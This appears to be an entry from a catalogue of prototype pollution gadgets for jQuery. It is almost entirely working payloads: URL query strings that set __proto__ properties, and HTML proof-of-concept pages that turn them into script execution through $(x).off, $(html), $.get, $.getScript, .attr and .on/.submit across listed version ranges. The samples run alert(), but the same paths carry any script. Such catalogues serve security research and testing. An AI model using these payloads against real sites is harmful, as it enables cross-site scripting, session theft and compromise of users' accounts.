## jQuery 

URL: https://jquery.com/

### JS Fingerprint
```
return (typeof $ !== 'undefined' && typeof $.fn !== 'undefined' && typeof $.fn.jquery !== 'undefined')
```

### PoC

#### $(x).off jQuery all versions

* Can be exploited through String.prototype

```
?__proto__[preventDefault]=x&__proto__[handleObj]=x&__proto__[delegateTarget]=<img/src/onerror%3dalert(document.domain)>
```

```html
<script/src=https://code.jquery.com/jquery-3.3.1.js></script>
<script>
  Object.prototype.preventDefault='x'
  Object.prototype.handleObj='x'
  Object.prototype.delegateTarget='<img/src/onerror=alert(1)>'
  /* No extra code needed for jQuery 1 & 2 */
  $(document).off('foobar');
</script>
```

#### $(html) jQuery all versions

```
?__proto__[div][0]=1&__proto__[div][1]=<img src onerror%3dalert(1)>
```

```html
<script/src=https://code.jquery.com/jquery-3.3.1.js></script>
<script>
  Object.prototype.div=['1','<img src onerror=alert(1)>']
</script>
<script>
  $('<div x="x"></div>')
</script>
```

#### $.get jQuery >= 3.0.0

* Also can be used for $.post, $.ajax, $.getJSON
* Can be exploited through Boolean.prototype

```
?__proto__[url][]=data:,alert(1)//&__proto__[dataType]=script
```

```html
<script src=https://code.jquery.com/jquery-3.5.1.js></script>
<script> 
  Object.prototype.url = ['data:,alert(1)//'];   
  Object.prototype.dataType = 'script';
</script>      
<script>
  $.get('https://google.com/'); 
  $.post('https://google.com/'); 
</script>
```

#### $.getScript jQuery >= 3.4.0
```
?__proto__[src][]=data:,alert(1)//
```

```html
<script src=https://code.jquery.com/jquery-3.5.1.js></script>
<script>
  Object.prototype.src = ['data:,alert(1)//']
</script>
<script>
  $.getScript('https://google.com/')
</script>
```

#### $.getScript jQuery 3.0.0 - 3.3.1

* Can be exploited through Boolean.prototype

```
?__proto__[url]=data:,alert(1)//
```

```html
<script/src=https://code.jquery.com/jquery-3.3.1.js></script>
<script>
  Object.prototype.url = 'data:,alert(1)//'
</script>
<script>
  $.getScript('https://google.com/')
</script>
```

#### $.get jQuery all versions

```
?__proto__[context]=<img/src/onerror%3dalert(1)>&__proto__[jquery]=x
```

```html
<script src=https://cdnjs.cloudflare.com/ajax/libs/jquery/1.10.0/jquery.js></script>
<script> 
  Object.prototype.context = '<img/src/onerror=alert(1)>';
  Object.prototype.jquery = 'x';
</script>      
<script>
  jQuery.get('http://google.com/');
</script>
```

#### $.get jQuery >= 3.0.0

* Can be exploited through Boolean.prototype

```
?__proto__[url]=data:,alert(1)//&__proto__[dataType]=script&__proto__[crossDomain]=
```

```html
<script src=https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.js></script>
<script> 
  Object.prototype.url = 'data:,alert(1)//';
  Object.prototype.dataType = 'script';   
  Object.prototype.crossDomain = '';
</script>      
<script>
  $.get('http://google.com/'); 
  $.post('http://google.com/'); 
</script>
```

#### $(x).attr jQuery >= 1.8.0

* Sets the attribute of an element

```
?__proto__[OnError]=alert(1)&__proto__[SRC]=fakeimagewontload
```

```html
<img id="test" src=realimage.jpg>
<script src=https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.js></script>
<script>
  Object.prototype.OnError = 'alert(1)';
  Object.prototype.SRC = 'fakeimagewontload.jpg';
</script>
<script>
$('#test').attr({"width":"100%"}) // The {} is being polluted with extra attributes
</script>
```

#### <span>$</span>(x).on, <span>$</span>(x).submit jQuery >= 1.9.0

* Requires user interaction
* Can be exploited through Function.prototype

```
?__proto__[handler][]=x&__proto__[selector][]=<img/src/onerror%3Dalert(1)>&__proto__[focus]=x&__proto__[needsContext]=x
```

```html
<script src=https://code.jquery.com/jquery-3.7.1.js></script>
<form id="search">
  <input id="y" />
</form>
<script>
Object.prototype.handler = ["x"];
Object.prototype.selector = ["<img/src/onerror=alert(1)>"];
Object.prototype.delegateType = "focus";
Object.prototype.needsContext = "x";
</script>
<script>
$("#search").submit(() => {});
</script>
```

```
?__proto__[handler][]=x&__proto__[selector][]=<img/src/onerror%3Dalert(1)>&__proto__[needsContext]=x
```

```html
<script src=https://code.jquery.com/jquery-1.9.0.js></script>
<div id="search">
  <div>Test</div>
</div>
<script>
Function.prototype.handler = ["x"];
Function.prototype.selector = ["<img/src/onerror=alert(123)>"];
Function.prototype.needsContext = "x";
</script>
<script>
$("#search").on("click", () => {});
</script>
```